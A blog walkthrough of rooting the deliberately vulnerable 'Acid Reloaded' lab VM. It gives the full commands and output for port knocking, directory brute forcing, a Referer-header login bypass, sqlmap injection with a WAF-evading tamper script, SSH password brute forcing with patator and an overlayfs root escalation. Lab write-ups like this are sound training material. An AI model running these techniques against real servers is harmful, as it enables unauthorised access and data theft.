---
layout: 		post
title:  		"Acid Reloaded hacking"
subtitle: 		"Fun with the vulnerable OS Acid Reloaded"
date:			2016-05-22 19:28:17 
categories: 	["itsec","tools"]
---

We know that there are many ways to gain access to a server out there. We can use several known exploits, unknown 0days and even social engineer to access. These activities are also all depending on training. A good way to train are *Capture the Flag* events and vulnerable systems which are made to be vulnerable. As CTF events are mostly event and time based I'm focusing on the second way, using vulnerable systems. A good place to gain some is VulnOS, the systems are served there as virtual machines. So it's easy to embed them.

I will focus in this post on the vulnerable machine **Acid Reloaded**, as it was really fun to solve it.

![](https://i.imgur.com/WR44iSE.png)


Table of contents

* Will be replaced with the ToC, excluding the "Contents" header
{:toc}



## Setting it up

Setting it up is fairly easy. Just download it (best way is via Torrent as the bandwidth is limited for the website). Unzip it and you have a folder with **VMWare** virtual disks. You can easily embed them in **VMWare Workstation** or **Oracle Virtual Box**. I converted the disk to a proper *Virtual Box* format. For that, create a new VM with Linux settings, then go to the mediums manager and convert it to *.vdi*, I also marked it there then as read only, so no changes will be saved and I am able to shoot it up. Also I put it into an internal network of Virtual Box, with a slim Debian server which is acting as DHCP and DNS server.
For the pentesting purpose I'll use Kali Linux.

## Gather information

First thing to do is get down which IP the VM uses. Yes we can simple look at the DHCP server, but why... :wink:

	root@kali:~# nmap -sP 192.168.1.0/24

	Starting Nmap 7.12 ( https://nmap.org ) at 2016-05-22 20:12 CEST
	Nmap scan report for 192.168.1.100
	Host is up (0.00063s latency).
	MAC Address: 08:00:27:97:4A:32 (Oracle VirtualBox virtual NIC)
	Nmap scan report for 192.168.1.254
	Host is up (0.00051s latency).
	MAC Address: 08:00:27:69:BC:A0 (Oracle VirtualBox virtual NIC)
	Nmap scan report for 192.168.1.1
	Host is up.
	Nmap done: 256 IP addresses (3 hosts up) scanned in 5.36 seconds

Okay, the VM uses ```192.168.1.100``` as it's IP. Let's scan it:

	root@kali:~# nmap -sS -sV 192.168.1.100
	
	Starting Nmap 7.12 ( https://nmap.org ) at 2016-05-22 20:14 CEST
	Nmap scan report for 192.168.1.100
	Host is up (0.00036s latency).
	Not shown: 999 closed ports
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 6.7p1 Ubuntu 5ubuntu1.3 (Ubuntu Linux; protocol 2.0)
	MAC Address: 08:00:27:97:4A:32 (Oracle VirtualBox virtual NIC)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 1.62 seconds

Port ```:22``` is open with listening SSH on it, time to connect to it:

	root@kali:~# ssh root@192.168.1.100
	    _    ____ ___ ____        ____  _____ _     ___    _    ____  _____ ____  
	   / \  / ___|_ _|  _ \      |  _ \| ____| |   / _ \  / \  |  _ \| ____|  _ \ 
	  / _ \| |    | || | | |_____| |_) |  _| | |  | | | |/ _ \ | | | |  _| | | | |
	 / ___ \ |___ | || |_| |_____|  _ <| |___| |__| |_| / ___ \| |_| | |___| |_| |
	/_/   \_\____|___|____/      |_| \_\_____|_____\___/_/   \_\____/|_____|____/ 
	
																			-by Acid
	
	Wanna Knock me out ??? 
	3.2.1 Let's Start the Game.
	                                                                              
	root@192.168.1.100's password: 
	Permission denied, please try again.
	root@192.168.1.100's password: 

Hrmm, okay. So we have a SSH server here with a nice ASCII art banner. And a login. Shall we bruteforce? Shall we exploit? Nah, I think there has to be some other way. So let's scan it again, this time deeper, with all ports.

	root@kali:~# nmap -p1-65535 -sV -T4 192.168.1.100

	Starting Nmap 7.12 ( https://nmap.org ) at 2016-05-22 20:28 CEST
	Nmap scan report for 192.168.1.100
	Host is up (0.00022s latency).
	Not shown: 65533 closed ports
	PORT      STATE    SERVICE VERSION
	22/tcp    open     ssh     OpenSSH 6.7p1 Ubuntu 5ubuntu1.3 (Ubuntu Linux; protocol 2.0)
	33447/tcp filtered unknown
	MAC Address: 08:00:27:97:4A:32 (Oracle VirtualBox virtual NIC)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 3.81 seconds

Okay, we have another port, ```33447```. It's filtered and we cannot reach it. Let's lean back and drink a cup of coffee/tea. Hrmmm.... Do you remember the banner of SSH? There is *Knock* written, with a capital letter. And 3, 2, 1. To start the game. 
Do you know port knocking? It's a way to restrict access to a port. Other ports have to be "triggered", so a firewall (like iptables) adds the own IP to allow rules. And this "3, 2, 1" looks like a sequence. Let's try it:

	root@kali:~# for i in {3..1}; do nmap -Pn --host_timeout 100 --max-retries 0 -p $i 192.168.1.100; done && nmap -p1-65535 -sV -T4 192.168.1.100
	
	Starting Nmap 7.12 ( https://nmap.org ) at 2016-05-22 20:54 CEST
	Nmap scan report for 192.168.1.100
	Host is up (0.00033s latency).
	PORT  STATE  SERVICE
	3/tcp closed compressnet
	MAC Address: 08:00:27:97:4A:32 (Oracle VirtualBox virtual NIC)
	
	Nmap done: 1 IP address (1 host up) scanned in 0.14 seconds
	
	Starting Nmap 7.12 ( https://nmap.org ) at 2016-05-22 20:54 CEST
	Nmap scan report for 192.168.1.100
	Host is up (0.00023s latency).
	PORT  STATE  SERVICE
	2/tcp closed compressnet
	MAC Address: 08:00:27:97:4A:32 (Oracle VirtualBox virtual NIC)
	
	Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds
	
	Starting Nmap 7.12 ( https://nmap.org ) at 2016-05-22 20:54 CEST
	Nmap scan report for 192.168.1.100
	Host is up (0.00023s latency).
	PORT  STATE  SERVICE
	1/tcp closed tcpmux
	MAC Address: 08:00:27:97:4A:32 (Oracle VirtualBox virtual NIC)
	
	Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds
	
	Starting Nmap 7.12 ( https://nmap.org ) at 2016-05-22 20:54 CEST
	Nmap scan report for 192.168.1.100
	Host is up (0.00025s latency).
	Not shown: 65533 closed ports
	PORT      STATE SERVICE VERSION
	22/tcp    open  ssh     OpenSSH 6.7p1 Ubuntu 5ubuntu1.3 (Ubuntu Linux; protocol 2.0)
	33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
	MAC Address: 08:00:27:97:4A:32 (Oracle VirtualBox virtual NIC)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 14.39 seconds

Wow, as we see, the port opened! :tada:

## The webserver

Let's open it in a browser!

![](https://i.imgur.com/D4LjjAO.png)

Okay, we shall use our brain. Well, we are already doing, so we are on a good way I assume. The image is in ```/images/```, but this gives a 403 Forbidden error. We have to keep on that trail and gain more information. to do this we should bruteforce the directory of the webserver. I am using [dirsearch](https://github.com/maurosoria/dirsearch)[^1] here, it's a nice Python based app to scan webservers. 

	root@kali:~/dirsearch# ./dirsearch.py -u "http://192.168.1.100:33447/" -e php,js -x 403
	
	 _|. _ _  _  _  _ _|_    v0.3.6
	(_||| _) (/_(_|| (_| )
	
	Extensions: php, js | Threads: 10 | Wordlist size: 5537
	
	Error Log: /root/dirsearch/logs/errors-16-05-22_21-33-51.log
	
	Target: http://192.168.1.100:33447/
	
	[21:33:51] Starting: 
	[21:33:58] 301 -  321B  - /bin  ->  http://192.168.1.100:33447/bin/
	[21:33:58] 200 -    1KB - /bin/
	[21:33:59] 301 -  321B  - /css  ->  http://192.168.1.100:33447/css/
	[21:34:01] 301 -  322B  - /html  ->  http://192.168.1.100:33447/html/
	[21:34:01] 301 -  324B  - /images  ->  http://192.168.1.100:33447/images/
	[21:34:01] 200 -  682B  - /index.html
	
	Task Completed

Okay, so we have 3 more directories there, let's get to ```/bin```.

![](https://i.imgur.com/FFXymlZ.png)

Interesting, a login form. Shall we penetrate it? Well, let's dig more into ```/bin/```:

	root@kali:~/dirsearch# ./dirsearch.py -u "http://192.168.1.100:33447/bin/" -e php,js -x 403
	
	 _|. _ _  _  _  _ _|_    v0.3.6
	(_||| _) (/_(_|| (_| )
	
	Extensions: php, js | Threads: 10 | Wordlist size: 5537
	
	Error Log: /root/dirsearch/logs/errors-16-05-22_22-03-56.log
	
	Target: http://192.168.1.100:33447/bin/
	
	[22:03:56] Starting: 
	[22:03:56] 301 -  324B  - /bin/js  ->  http://192.168.1.100:33447/bin/js/
	[22:03:56] 200 -   17B  - /bin/.gitignore
	[22:04:04] 301 -  327B  - /bin/crack  ->  http://192.168.1.100:33447/bin/crack/
	[22:04:04] 301 -  325B  - /bin/css  ->  http://192.168.1.100:33447/bin/css/
	[22:04:04] 200 -  675B  - /bin/dashboard.php
	[22:04:06] 301 -  330B  - /bin/includes  ->  http://192.168.1.100:33447/bin/includes/
	[22:04:06] 200 -    1KB - /bin/index.php
	[22:04:06] 200 -    1KB - /bin/index.php/login/
	[22:04:06] 301 -  324B  - /bin/js  ->  http://192.168.1.100:33447/bin/js/
	[22:04:09] 301 -  328B  - /bin/styles  ->  http://192.168.1.100:33447/bin/styles/
	
	Task Completed

Okay, we have here a ```dashboard.php```, that looks promising. But it isn't. Let's waste more time and try to exploit the login form with SQLi via **sqlmap**, but all we get is:

	[22:25:47] [CRITICAL] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp') If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment')

So, SQLi won't work, too. Damn it. I think it's the first time for a pause and think about it. :rage1:

OK, after stroking the cat and watching two *Mr. Robot* episodes I am thinking about HTTP Headers and the funny dog picture at ```dashboard.php```. This has to be the trail, let's test a view things and play with HTTP headers. I assume header ```Host:``` won't really help. Bah, still no clue. I asked in VulnHub channel in Freenode and someone gave me the hint to use ```Referer:```. Yes, this was kinda cheating, but I was really frustrated, so I put some social in it (aka asking). And after some playing with **curl** I got that:

	root@kali:~/dirsearch# curl --referer "http://192.168.1.100:33447/bin/includes/validation.php" http://192.168.1.100:33447/bin/dashboard.php
	
	<!DOCTYPE html>
	<html>
	    <head>
	        <meta charset="UTF-8">
	  	<link rel="stylesheet" href="crack/css/style.css">
	        <link rel="stylesheet" href="styles/main.css" />
	        <title>Acid-Reloaded</title>
	    </head>
	    <body>
		 <div class="wrapper">
	                <div class="container">
	        					        		<center><p> <h1>Congratulations </p>
				<p>You have bypassed login panel successfully.</h1> <br> </center></p>
			        <center><p><h3>Come'on bang your head here. <a href="l33t_haxor.php">Click</a>.</h3></p>
	
	        		<p><h3>If you are done, please <a href="includes/logout.php">log out</a>.</h3></p></center>
	
				    </body>
	</html>

Bam, this looks promising. we have two new files here! ```l33t_haxor.php``` and ```includes/logout.php```. Let's look what the first one will show us.

![](https://i.imgur.com/c5sfxr1.png)

## SQLi it!

Yes, that's how we look like at the moment, we had a success. But this could not be all, so let's look at the source. We see a empty link there: ```<a href="l33t_haxor.php?id=" style="text-decoration:none"></a>```, with an parameter. Could it be? COULD IT BE??!!! Let's SQLi it!

![](https://i.imgur.com/7bXDmsQ.png)

WOOT?? There is some WAF[^2] there? Let's test it a bit more:

![](https://i.imgur.com/OCEnv55.png)

Wababadabam, it **is** inject-able. Let's fire up **sqlmap** because we are lazy (yes, yes, could be injected by hand, but for what are computers invented?). With simple firing the URL in paramater ```-u``` it says it's not inject-able. Remember the problem before? It actually looks like there is some **WAF**. Hrmm, look at this [site](https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423). it says:

	tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor

So let's use all these scripts and test it, each after one and another. The tamper script which is working is ```space2comment```. The working command is:

	sqlmap -u "http://192.168.1.100:33447/bin/l33t_haxor.php?id=1" --dbs --tamper=space2comment

This gives us this data:

	[23:05:09] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
	GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
	sqlmap identified the following injection point(s) with a total of 69 HTTP(s) requests:
	---
	Parameter: id (GET)
	    Type: boolean-based blind
	    Title: AND boolean-based blind - WHERE or HAVING clause
	    Payload: id=1') AND 9245=9245 AND ('OLGc'='OLGc
	
	    Type: error-based
	    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
	    Payload: id=1') AND (SELECT 1120 FROM(SELECT COUNT(*),CONCAT(0x7178787671,(SELECT (ELT(1120=1120,1))),0x7171627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('siRj'='siRj
	
	    Type: AND/OR time-based blind
	    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
	    Payload: id=1') AND (SELECT * FROM (SELECT(SLEEP(5)))ZKtE) AND ('SFwj'='SFwj
	
	    Type: UNION query
	    Title: MySQL UNION query (NULL) - 2 columns
	    Payload: id=-6050') UNION ALL SELECT NULL,CONCAT(0x7178787671,0x4f4e506b497553466867656350785855504a77645851696952736d644c444e484747764a48726a4b,0x7171627171)#
	---
	[23:05:12] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
	[23:05:12] [INFO] the back-end DBMS is MySQL
	web server operating system: Linux Ubuntu
	web application technology: Apache 2.4.10
	back-end DBMS: MySQL 5.0
	[23:05:12] [INFO] fetching database names
	[23:05:12] [INFO] the SQL query used returns 4 entries
	[23:05:12] [INFO] retrieved: information_schema
	[23:05:12] [INFO] retrieved: mysql
	[23:05:12] [INFO] retrieved: performance_schema
	[23:05:12] [INFO] retrieved: secure_login
	available databases [4]:                                                                                                                       
	[*] information_schema
	[*] mysql
	[*] performance_schema
	[*] secure_login

Now we have to swing from one node to another, like Tarzan.

![](https://i.imgur.com/D2OWDYR.jpg)

I won't post here all what I found, just the relevant data.

	Database: secure_login                                                                                                                                     
	[4 tables]
	+-----------------+
	| UB3R/strcpy.exe |
	| login_attempts  |
	| members         |
	| word            |
	+-----------------+

## We need to get deepar!

The tables are empty. So we have to take that information and do something with it. I just take that ```UB3R/strcpy.exe``` as a hint, maybe a path, so I test it on the webserver. And ```http://192.168.1.100:33447/UB3R/strcpy.exe``` worked. Downloaded it. As I'm a member of MalwareMustDie and due this I have to handle much malware, I'm always curious and check the mime of a file.

	root@kali:~/Downloads# file strcpy.exe 
	strcpy.exe: PDF document, version 1.5

No PE, but a PDF. Okay...

	root@kali:~/Downloads# pdfinfo strcpy.exe 
	Author:         Avinash Thapa
	Creator:        Microsoft® Word 2013
	Producer:       Microsoft® Word 2013
	CreationDate:   Sun Aug 23 18:23:14 2015
	ModDate:        Sun Aug 23 18:23:14 2015
	Tagged:         yes
	UserProperties: no
	Suspects:       no
	Form:           none
	JavaScript:     no
	Pages:          1
	Encrypted:      no
	Page size:      595.32 x 841.92 pts (A4)
	Page rot:       0
	File size:      168187 bytes
	Optimized:      no
	PDF version:    1.5

Extracting data out of it gave me that:

![](https://i.imgur.com/nwvNLT5.png) 

I will show only the relevant data again:

	root@kali:~/Downloads# strings strcpy.exe
	%%EOFRar!
	acid.txt
	You are at right track.
	Don't loose hope..
	Good Luck :-)
	Kind & Best Regards,
	Acid
	lol.jpg


Lol, wat, ```%%EOFRar!```. Is there a **RAR** archive in it?

	root@kali:~/Downloads# unrar e strcpy.exe
	
	UNRAR 5.30 beta 2 freeware      Copyright (c) 1993-2015 Alexander Roshal

	Extracting from strcpy.exe
	
	Extracting  acid.txt                                                  OK 
	Extracting  lol.jpg                                                   OK 
	All OK
	
	root@kali:~/Downloads# cat acid.txt 
	You are at right track.
	
	Don't loose hope..
	
	Good Luck :-)
	
	Kind & Best Regards,
	Acid

Nice! Let's look at ```lol.jpg```. It's getting a routine :smile:

	root@kali:~/Downloads# unrar e lol.jpg
	
	UNRAR 5.30 beta 2 freeware      Copyright (c) 1993-2015 Alexander Roshal
	
	
	Extracting from lol.jpg
	
	Extracting  Avinash.contact                                           OK 
	Extracting  hint.txt                                                  OK 
	All OK

	root@kali:~/Downloads# cat hint.txt 
	You have found a contact. Now, go and grab the details :-)

Okay, let's look at the contact. 

	root@kali:~/Downloads# cat Avinash.contact 
	<?xml version="1.0" encoding="UTF-8"?>
	<c:contact c:Version="1" xmlns:c="http://schemas.microsoft.com/Contact" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:MSP2P="http://schemas.microsoft.com/Contact/Extended/MSP2P" xmlns:MSWABMAPI="http://schemas.microsoft.com/Contact/Extended/MSWABMAPI">
		<c:CreationDate>2015-08-23T11:39:18Z</c:CreationDate>
		<c:Extended>
			<MSWABMAPI:PropTag0x3A58101F c:ContentType="binary/x-ms-wab-mapi" c:type="binary">AQAAABIAAABOAG8AbwBCAEAAMQAyADMAAAA=</MSWABMAPI:PropTag0x3A58101F>
		</c:Extended>
		<c:ContactIDCollection>
			<c:ContactID c:ElementID="599ef753-f77f-4224-8700-e551bdc2bb1e">
				<c:Value>0bcf610e-a7be-4f26-9042-d6b3c22c9863</c:Value>
			</c:ContactID>
		</c:ContactIDCollection>
		<c:EmailAddressCollection>
			<c:EmailAddress c:ElementID="0745ffd4-ef0a-4c4f-b1b6-0ea38c65254e">
				<c:Type>SMTP</c:Type>
				<c:Address>acid.exploit@gmail.com</c:Address>
				<c:LabelCollection><c:Label>Preferred</c:Label></c:LabelCollection>
			</c:EmailAddress>
			<c:EmailAddress c:ElementID="594eec25-47bd-4290-bd96-a17448f7596a" xsi:nil="true"/>
		</c:EmailAddressCollection>
		<c:NameCollection>
			<c:Name c:ElementID="318f9ce5-7a08-4ea0-8b6a-2ce3e9829ff2">
				<c:FormattedName>Avinash</c:FormattedName>
				<c:GivenName>Avinash</c:GivenName>
			</c:Name>
		</c:NameCollection>
		<c:PersonCollection>
			<c:Person c:ElementID="865f9eda-796e-451a-92b1-bf8ee2172134">
				<c:FormattedName>Makke</c:FormattedName>
				<c:LabelCollection><c:Label>wab:Spouse</c:Label></c:LabelCollection>
			</c:Person>
		</c:PersonCollection>
		<c:PhotoCollection><c:Photo c:ElementID="2fb5b981-cec1-45d0-ae61-7c340cfb3d72">
		<c:LabelCollection>
			<c:Label>UserTile</c:Label>
		</c:LabelCollection>
		</c:Photo></c:PhotoCollection>
		</c:contact>

Here are some strings of interest:

	AQAAABIAAABOAG8AbwBCAEAAMQAyADMAAAA=
	acid.exploit@gmail.com
	Avinash
	Makke
	wab:Spouse

The first sting looks like **base64** encoded: 

	root@kali:~/Downloads# echo AQAAABIAAABOAG8AbwBCAEAAMQAyADMAAAA= | base64 --decode
	NooB@123

## Brute force it

Okay, one more string. Remember the SSH login before? These strings look like passwords, so let's fire up **patator**. I made a ```wordlist.txt``` with the strings above. Giving the same ```FILE0``` to password and user won't work in *patator*, you need to read it again with another indicator.

	root@kali:~/VulnOS/Acid# patator ssh_login host=192.168.1.100 port=22 0=wordlist.txt 1=wordlist.txt user=FILE0 password=FILE1 -x ignore:mesg='Authentication failed.'
	23:58:46 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2016-05-22 23:58 CEST
	23:58:46 patator    INFO -                                                                              
	23:58:46 patator    INFO - code  size   time | candidate                          |   num | mesg
	23:58:46 patator    INFO - -----------------------------------------------------------------------------
	00:00:03 patator    INFO - 0     39    0.044 | makke:NooB@123                     |    66 | SSH-2.0-OpenSSH_6.7p1 Ubuntu-5ubuntu1.3
	00:01:06 patator    INFO - Hits/Done/Skip/Fail/Size: 1/121/0/0/121, Avg: 0 r/s, Time: 0h 2m 19s

Let's login and look around.

## Inside the system

	root@kali:~/VulnOS/Acid# ssh makke@192.168.1.100
	    _    ____ ___ ____        ____  _____ _     ___    _    ____  _____ ____  
	   / \  / ___|_ _|  _ \      |  _ \| ____| |   / _ \  / \  |  _ \| ____|  _ \ 
	  / _ \| |    | || | | |_____| |_) |  _| | |  | | | |/ _ \ | | | |  _| | | | |
	 / ___ \ |___ | || |_| |_____|  _ <| |___| |__| |_| / ___ \| |_| | |___| |_| |
	/_/   \_\____|___|____/      |_| \_\_____|_____\___/_/   \_\____/|_____|____/ 
	
																			-by Acid
	
	Wanna Knock me out ??? 
	3.2.1 Let's Start the Game.
	                                                                              
	makke@192.168.1.100's password: 
	Welcome to Ubuntu 15.04 (GNU/Linux 3.19.0-15-generic i686)
	
	 * Documentation:  https://help.ubuntu.com/
	
	Last login: Mon Aug 24 21:25:34 2015 from 192.168.88.236
	makke@acid:~$ ls
	makke@acid:~$ ls -al
	total 32
	drwxr-xr-x 3 makke makke 4096 Aug 24  2015 .
	drwxr-xr-x 4 root  root  4096 Aug 24  2015 ..
	-rw------- 1 makke makke  205 Aug 24  2015 .bash_history
	-rw-r--r-- 1 makke makke  220 Aug 24  2015 .bash_logout
	-rw-r--r-- 1 makke makke 3760 Aug 24  2015 .bashrc
	drwx------ 2 makke makke 4096 Aug 24  2015 .cache
	-rw-rw-r-- 1 makke makke   40 Aug 24  2015 .hint
	-rw-r--r-- 1 makke makke  675 Aug 24  2015 .profile
	makke@acid:~$ cat .hint
	Run the executable to own kingdom :-)
	
	
	makke@acid:~$ cat .bash_history
	exit
	cd ..
	clear
	cd /
	ls
	cd bin/
	clear
	./overlayfs 
	clear
	cd /home/makke/
	clear
	nano .hint
	clear
	ls
	clear
	ls
	ls -a
	cat .hint 
	clear
	cd /bin/
	ls
	./overlayfs 
	clear
	wgt
	wget
	apt-get remove wget
	su
	su -
	exit
	makke@acid:~$ 

> Run the executable to own kingdom :-)

Okay. There is ```./overlayfs``` in the history. Maybe that is our ELF?

	makke@acid:/bin$ ./overlayfs 
	spawning threads
	mount #1
	mount #2
	child threads done
	/etc/ld.so.preload created
	creating shared library
	# whoami
	root

Yay, we have root! :godmode:

	# cd /root
	# ls -al
	total 68
	drwx------  5 root root  4096 Aug 24  2015 .
	drwxr-xr-x 22 root root  4096 Aug 24  2015 ..
	-rw-------  1 root root 23934 Aug 24  2015 .bash_history
	-rw-r--r--  1 root root  3135 Aug  8  2015 .bashrc
	drwx------  2 root root  4096 Aug 24  2015 .cache
	drwx------  3 root root  4096 Aug  6  2015 .config
	drwx------  3 root root  4096 Aug  6  2015 .dbus
	-rw-r--r--  1 root root   284 Aug 24  2015 .flag.txt
	-rw-------  1 root root  2775 Aug 24  2015 .mysql_history
	-rw-------  1 root root   147 Aug 24  2015 .nano_history
	-rw-r--r--  1 root root   140 Feb 20  2014 .profile
	-rw-r--r--  1 root root    66 Aug  6  2015 .selected_editor
	# cat .flag.txt
	Dear Hax0r,
	
	You have completed the Challenge Successfully.
	
	Your Flag is : "Black@Current@Ice-Cream"
	
	Kind & Best Regards
	
	-ACiD
	
	Twitter:https://twitter.com/m_avinash143
	Facebook: https://www.facebook.com/M.avinash143
	LinkedIN: https://in.linkedin.com/pub/avinash-thapa/101/406/4b5

Oh yay, we made it! It's our flag now! Hooray!

## Conclusion

As we see, many puzzle pieces have to put together. Also there is no golden path, there are many ways to gain the flag, this is just one of them. I hope I teached you some nice techniques here and you had as much fun as me. This virtual machine was really fun. Thank you Acid!

![](https://i.imgur.com/fzRnJP1.jpg)


[^1]: Uses Python, you will need it.
[^2]: Web Application Firewall, kinda analysis traffic and detects stuff like SQL injections. At least, should detect.